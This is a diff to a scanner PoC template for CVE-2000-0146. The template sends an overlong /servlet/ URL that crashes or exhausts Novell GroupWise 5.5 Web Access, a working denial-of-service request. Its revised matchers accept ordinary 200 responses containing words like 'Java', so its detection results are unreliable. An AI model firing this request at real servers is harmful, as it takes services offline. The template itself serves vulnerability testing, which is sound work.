@@ -1,14 +1,14 @@
 [info]
 author = "AVE"
-description = "通过向 GroupWise Java Server 的 /servlet 路径发送超长 URI（200+ 字符），可触发 Java Server 异常崩溃，导致 Web Access 服务不可用。发送后服务器 Java.nlm 进程将耗尽 CPU 资源，需重启恢复。"
+description = "通过向 Novell GroupWise 5.5 Enhancement Pack Web Access 的 /servlet/ 端点发送超长 URL（200+ 字符），可触发 Java.nlm 进程 CPU 耗尽或 post office 服务停止，导致拒绝服务。本 PoC 发送长 URL 请求验证目标是否存在该漏洞。"
 id = "POC-AVE-2000-0131"
-name = "Novell GroupWise Web Access Enhancement Pack 拒绝服务漏洞 PoC"
+name = "Novell GroupWise 5.5 Web Access Java Servlet 拒绝服务漏洞 PoC"
 severity = "medium"
 tags = [
     "cve-2000-0146",
+    "dos",
     "novell",
     "groupwise",
-    "dos",
 ]
 vuln_id = [
     "CVE-2000-0146",
@@ -20,15 +20,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/servlet/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+path = "/{{BaseURL}}/servlet/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
+part = "body"
 status = [
+    200,
     500,
     503,
 ]
@@ -39,8 +38,8 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "Error",
-    "Exception",
-    "unavailable",
-    "Service Temporarily Unavailable",
+    "Java",
+    "Servlet",
+    "GroupWise",
+    "Novell",
 ]
